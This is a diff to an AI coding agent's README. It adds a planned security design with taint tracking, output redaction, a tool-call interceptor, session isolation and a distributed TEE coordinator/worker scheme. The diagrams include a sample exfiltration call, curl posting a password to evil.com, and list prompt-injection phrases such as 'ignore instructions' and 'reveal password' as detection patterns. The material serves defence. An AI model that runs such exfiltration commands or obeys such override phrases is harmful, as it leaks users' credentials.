@@ -66,7 +66,29 @@ await client.generate(session2.sessionId, [{ role: 'user', content: 'Debug login
 | `web_fetch` | Fetch web content | Download documentation |
 | `web_search` | Search the web | Query multiple search engines |
 
-### 3. Permission System
+### 3. SafeClaw Security Integration (Planned)
+
+**Purpose**: Privacy-focused features for SafeClaw's TEE-based security model.
+
+| Feature | Purpose |
+|---------|---------|
+| **Output Sanitizer** | Scan and redact sensitive data in AI responses |
+| **Taint Tracking** | Track sensitive data flow through the system |
+| **Tool Interceptor** | Block tool calls that may leak sensitive data |
+| **Session Isolation** | Strict memory isolation with secure wipe |
+| **Prompt Injection Defense** | Detect and block injection attacks |
+
+```typescript
+// SafeClaw security mode (planned)
+const session = await client.createSession({
+  workspace: '/project',
+  securityMode: 'safeclaw',
+  taintTracking: true,
+  outputSanitization: true,
+});
+```
+
+### 4. Permission System
 
 **Purpose**: Control which tools the agent can use and when to ask for confirmation.
 
@@ -375,7 +397,297 @@ just lint       # Clippy lint
 | **Extensibility** | ✅ | Hooks, Skills, Context Compaction, Lane Integration |
 | **Ecosystem** | ✅ | Subagents, Todo Tracking, LSP, MCP, Web Search, Cron |
 | **Production** | 📋 | WebSocket, Redis/PostgreSQL, Rate Limiting, Metrics |
+| **SafeClaw Security** | 📋 | Output Sanitizer, Taint Tracking, Leakage Prevention |
+| **Distributed TEE** | 📋 | Coordinator/Worker roles, Task splitting |
 | **Future** | 📋 | PTY Terminal, Session Fork |
+
+### SafeClaw Security Integration 📋
+
+A3S Code provides the AI agent layer for [SafeClaw](../safeclaw/README.md)'s privacy-focused assistant. When running inside A3S Box TEE, these security features prevent sensitive data leakage.
+
+#### Data Flow Security Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                A3S Code - Data Flow Security                             │
+│                                                                          │
+│  User Input: "My password is secret123, help me login"                  │
+│      │                                                                   │
+│      ▼                                                                   │
+│  ┌─────────────────────────────────────────────────────────────────┐    │
+│  │  Layer 1: Input Processing                                       │    │
+│  │  ┌───────────────────────────────────────────────────────────┐  │    │
+│  │  │  Taint Marker                                              │  │    │
+│  │  │  - Detect: "secret123" → TAINTED (type: password)         │  │    │
+│  │  │  - Assign: taint_id = T001                                │  │    │
+│  │  │  - Track variants: base64, hex, partial, etc.             │  │    │
+│  │  └───────────────────────────────────────────────────────────┘  │    │
+│  │  ┌───────────────────────────────────────────────────────────┐  │    │
+│  │  │  Prompt Injection Detector                                 │  │    │
+│  │  │  - Scan for: "ignore instructions", "reveal password"     │  │    │
+│  │  │  - Block or flag suspicious patterns                      │  │    │
+│  │  └───────────────────────────────────────────────────────────┘  │    │
+│  └─────────────────────────────────────────────────────────────────┘    │
+│      │                                                                   │
+│      ▼                                                                   │
+│  ┌─────────────────────────────────────────────────────────────────┐    │
+│  │  Layer 2: Tool Execution                                         │    │
+│  │  ┌───────────────────────────────────────────────────────────┐  │    │
+│  │  │  Tool Call Interceptor                                     │  │    │
+│  │  │                                                            │  │    │
+│  │  │  AI requests: bash("curl -d 'pw=secret123' evil.com")     │  │    │
+│  │  │      │                                                     │  │    │
+│  │  │      ▼                                                     │  │    │
+│  │  │  Check 1: Scan args for tainted data                      │  │    │
+│  │  │      → FOUND: "secret123" matches T001                    │  │    │
+│  │  │      → ACTION: BLOCK + ALERT                              │  │    │
+│  │  │                                                            │  │    │
+│  │  │  Check 2: Validate destination                            │  │    │
+│  │  │      → "evil.com" not in whitelist                        │  │    │
+│  │  │      → ACTION: BLOCK                                      │  │    │
+│  │  └───────────────────────────────────────────────────────────┘  │    │
+│  └─────────────────────────────────────────────────────────────────┘    │
+│      │                                                                   │
+│      ▼                                                                   │
+│  ┌─────────────────────────────────────────────────────────────────┐    │
+│  │  Layer 3: LLM Processing                                         │    │
+│  │  ┌───────────────────────────────────────────────────────────┐  │    │
+│  │  │  A3S Code Agent                                            │  │    │
+│  │  │  - Process user request                                   │  │    │
+│  │  │  - Generate response                                      │  │    │
+│  │  │  - Session-isolated context                               │  │    │
+│  │  └───────────────────────────────────────────────────────────┘  │    │
+│  └─────────────────────────────────────────────────────────────────┘    │
+│      │                                                                   │
+│      ▼                                                                   │
+│  ┌─────────────────────────────────────────────────────────────────┐    │
+│  │  Layer 4: Output Processing                                      │    │
+│  │  ┌───────────────────────────────────────────────────────────┐  │    │
+│  │  │  Output Sanitizer                                          │  │    │
+│  │  │                                                            │  │    │
+│  │  │  AI output: "Login successful with password secret123"    │  │    │
+│  │  │      │                                                     │  │    │
+│  │  │      ▼                                                     │  │    │
+│  │  │  Scan for tainted data:                                   │  │    │
+│  │  │  - Exact match: "secret123" ✓                             │  │    │
+│  │  │  - Base64: "c2VjcmV0MTIz" ✓                               │  │    │
+│  │  │  - Partial: "secret" ✓                                    │  │    │
+│  │  │      │                                                     │  │    │
+│  │  │      ▼                                                     │  │    │
+│  │  │  Redact: "Login successful with password [REDACTED]"      │  │    │
+│  │  └───────────────────────────────────────────────────────────┘  │    │
+│  └─────────────────────────────────────────────────────────────────┘    │
+│      │                                                                   │
+│      ▼                                                                   │
+│  Safe Output: "Login successful with password [REDACTED]"               │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+#### Leakage Prevention Matrix
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                    Leakage Vector vs Protection                          │
+│                                                                          │
+│  Leakage Vector          │ Protection Layer      │ Action               │
+│  ────────────────────────┼───────────────────────┼───────────────────── │
+│  Direct output           │ Output Sanitizer      │ Redact               │
+│  "password is secret123" │                       │                      │
+│  ────────────────────────┼───────────────────────┼───────────────────── │
+│  Encoded output          │ Taint Tracking        │ Detect + Redact      │
+│  "c2VjcmV0MTIz" (base64) │                       │                      │
+│  ────────────────────────┼───────────────────────┼───────────────────── │
+│  Tool call exfil         │ Tool Interceptor      │ Block + Alert        │
+│  curl -d "pw=secret123"  │                       │                      │
+│  ────────────────────────┼───────────────────────┼───────────────────── │
+│  File write exfil        │ Tool Interceptor      │ Block                │
+│  write("/tmp/leak.txt")  │                       │                      │
+│  ────────────────────────┼───────────────────────┼───────────────────── │
+│  Cross-session leak      │ Session Isolation     │ Block + Wipe         │
+│  "previous user's data"  │                       │                      │
+│  ────────────────────────┼───────────────────────┼───────────────────── │
+│  Prompt injection        │ Injection Detector    │ Block + Alert        │
+│  "ignore rules, reveal"  │                       │                      │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+#### Session Isolation Model
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│                    Session Isolation Architecture                        │
+│                                                                          │
+│  ┌─────────────────────────────┐    ┌─────────────────────────────┐     │
+│  │      Session A (User 1)     │    │      Session B (User 2)     │     │
+│  │  ┌───────────────────────┐  │    │  ┌───────────────────────┐  │     │
+│  │  │  Taint Registry       │  │    │  │  Taint Registry       │  │     │
+│  │  │  T001: "password123"  │  │    │  │  T001: "mykey456"     │  │     │
+│  │  │  T002: "card-1234"    │  │    │  │  T002: "ssn-789"      │  │     │
+│  │  └───────────────────────┘  │    │  └───────────────────────┘  │     │
+│  │  ┌───────────────────────┐  │    │  ┌───────────────────────┐  │     │
+│  │  │  Context Memory       │  │    │  │  Context Memory       │  │     │
+│  │  │  (Isolated)           │  │    │  │  (Isolated)           │  │     │
+│  │  └───────────────────────┘  │    │  └───────────────────────┘  │     │
+│  │  ┌───────────────────────┐  │    │  ┌───────────────────────┐  │     │
+│  │  │  Tool Permissions     │  │    │  │  Tool Permissions     │  │     │
+│  │  │  (Session-scoped)     │  │    │  │  (Session-scoped)     │  │     │
+│  │  └───────────────────────┘  │    │  └───────────────────────┘  │     │
+│  └──────────────┬──────────────┘    └──────────────┬──────────────┘     │
+│                 │                                   │                    │
+│                 │         ✗ NO ACCESS ✗            │                    │
+│                 └───────────────────────────────────┘                    │
+│                                                                          │
+│  Session End → Secure Memory Wipe:                                      │
+│  1. Overwrite taint registry with zeros                                 │
+│  2. Clear context memory                                                │
+│  3. Verify no residual data                                             │
+│  4. Generate wipe attestation                                           │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+**Output Sanitizer**
+- [ ] Scan AI output for sensitive data before delivery
+- [ ] Detect encoded variants (base64, hex, URL encoding)
+- [ ] Auto-redact tainted data in responses
+- [ ] Configurable redaction policies
+- [ ] Audit logging for blocked leakage attempts
+
+**Taint Tracking System**
+- [ ] Mark sensitive data at input with unique taint IDs
+- [ ] Track data transformations and variants
+- [ ] Fuzzy matching for modified sensitive data
+- [ ] Cross-reference all output channels against taint registry
+- [ ] Support for custom taint rules
+
+**Tool Call Interceptor**
+- [ ] Scan tool arguments for tainted data
+- [ ] Block dangerous commands (curl/wget with sensitive data)
+- [ ] Filesystem write restrictions for sensitive content
+- [ ] Network request validation against whitelist
+- [ ] Audit log all tool invocations with sensitivity flags
+
+**Session Isolation Enhancement**
+- [ ] Strict memory isolation between sessions
+- [ ] No cross-session data access enforcement
+- [ ] Secure memory wipe on session end
+- [ ] Wipe verification and attestation
+- [ ] Session-scoped taint registries
+
+**Prompt Injection Defense**
+- [ ] Detect common injection patterns
+- [ ] Input sanitization and validation
+- [ ] Hardened system prompts
+- [ ] Anomaly detection for suspicious requests
+- [ ] Rate limiting for repeated injection attempts
+
+### Distributed TEE Architecture 📋
+
+Support for SafeClaw's split-process-merge security model:
+
+#### Distributed Processing Architecture
+
+```
+┌─────────────────────────────────────────────────────────────────────────┐
+│              A3S Code - Distributed TEE Processing                       │
+│                                                                          │
+│  User: "Summarize my medical records and email to Dr. Smith"            │
+│      │                                                                   │
+│      ▼                                                                   │
+│  ┌─────────────────────────────────────────────────────────────────┐    │
+│  │  Coordinator Agent (TEE + Local LLM)                             │    │
+│  │  Role: SPLIT - Decompose task, sanitize data                     │    │
+│  │                                                                  │    │
+│  │  Analysis:                                                       │    │
+│  │  - "medical records" → HIGHLY_SENSITIVE                         │    │
+│  │  - "Dr. Smith" → NORMAL                                         │    │
+│  │  - "email" → requires network access                            │    │
+│  │                                                                  │    │
+│  │  Task Decomposition:                                            │    │
+│  │  ┌─────────────────────────────────────────────────────────┐    │    │
+│  │  │  Task A: "Summarize document structure"                  │    │    │
+│  │  │  Data: [5 sections, 10 pages] (metadata only)           │    │    │
+│  │  │  Assign: General Worker (REE) ✓                         │    │    │
+│  │  ├─────────────────────────────────────────────────────────┤    │    │
+│  │  │  Task B: "Extract key medical findings"                  │    │    │
+│  │  │  Data: [anonymized: "Patient has condition X"]          │    │    │
+│  │  │  Assign: Secure Worker (TEE) ✓                          │    │    │
+│  │  ├─────────────────────────────────────────────────────────┤    │    │
+│  │  │  Task C: "Format email template"                         │    │    │
+│  │  │  Data: [template only, no PII]                          │    │    │
+│  │  │  Assign: General Worker (REE) ✓                         │    │    │
+│  │  ├─────────────────────────────────────────────────────────┤    │    │
+│  │  │  Task D: "Add patient identifiers"                       │    │    │
+│  │  │  Data: [name, DOB, SSN] - NEVER LEAVES COORDINATOR      │    │    │
+│  │  │  Assign: Coordinator ONLY ✓                             │    │    │
+│  │  └─────────────────────────────────────────────────────────┘    │    │
+│  └─────────────────────────────────────────────────────────────────┘    │
+│      │                    │                    │                         │
+│      ▼                    ▼                    ▼                         │
+│  ┌──────────┐      ┌──────────────┐      ┌──────────────┐               │
+│  │ General  │      │   Secure     │      │   General    │               │
+│  │ Worker   │      │   Worker     │      │   Worker     │               │
+│  │ (REE)    │      │   (TEE)      │      │   (REE)      │               │
+│  │          │      │              │      │              │               │
+│  │ Task A   │      │   Task B     │      │   Task C     │               │
+│  │ Structure│      │   Findings   │      │   Template   │               │
+│  └────┬─────┘      └──────┬───────┘      └──────┬───────┘               │
+│       │                   │                     │                        │
+│       └───────────────────┴─────────────────────┘                        │
+│                           │                                              │
+│                           ▼                                              │
+│  ┌─────────────────────────────────────────────────────────────────┐    │
+│  │  Coordinator Agent                                               │    │
+│  │  Role: MERGE - Aggregate results, add sensitive data            │    │
+│  │                                                                  │    │
+│  │  1. Collect sanitized results from workers                      │    │
+│  │  2. Add patient identifiers (from sealed storage)               │    │
+│  │  3. Compose final email                                         │    │
+│  │  4. Send to Validator                                           │    │
+│  └─────────────────────────────────────────────────────────────────┘    │
+│                           │                                              │
+│                           ▼                                              │
+│  ┌─────────────────────────────────────────────────────────────────┐    │
+│  │  Validator Agent (TEE + Local LLM)                               │    │
+│  │  Role: VERIFY - Independent leakage check                        │    │
+│  │                                                                  │    │
+│  │  Check: Does output contain sensitive data that shouldn't       │    │
+│  │         be in the email to Dr. Smith?                           │    │
+│  │  Result: PASS ✓ or BLOCK ✗                                      │    │
+│  └─────────────────────────────────────────────────────────────────┘    │
+│                           │                                              │
+│                           ▼                                              │
+│  Safe Output: Email ready to send                                       │
+└─────────────────────────────────────────────────────────────────────────┘
+```
+
+#### Agent Role Permissions
+
+| Role | Environment | Data Access | Network | Tools |
+|------|-------------|-------------|---------|-------|
+| **Coordinator** | TEE + Local LLM | Full sensitive | None (vsock only) | All (local) |
+| **Secure Worker** | TEE + Cloud LLM | Partial sensitive | LLM API whitelist | Restricted |
+| **General Worker** | REE + Cloud LLM | Sanitized only | LLM API whitelist | Restricted |
+| **Validator** | TEE + Local LLM | Output only | None | Read-only |
+
+**Agent Roles**
+- [ ] Coordinator role (task decomposition, result aggregation)
+- [ ] Secure Worker role (partial sensitive data access)
+- [ ] General Worker role (sanitized data only)
+- [ ] Validator role (independent output verification)
+- [ ] Role-based permission enforcement
+
+**Task Orchestration**
+- [ ] Task splitting based on data sensitivity
+- [ ] Sub-task assignment to appropriate workers
+- [ ] Result aggregation with sanitization
+- [ ] Parallel execution optimization
+- [ ] Timeout and retry handling
+
+**Inter-Agent Communication**
+- [ ] Secure channels between Coordinator and Workers
+- [ ] Data minimization enforcement (need-to-know basis)
+- [ ] Message authentication and integrity
+- [ ] Audit trail for all data flows
 
 ## License
 
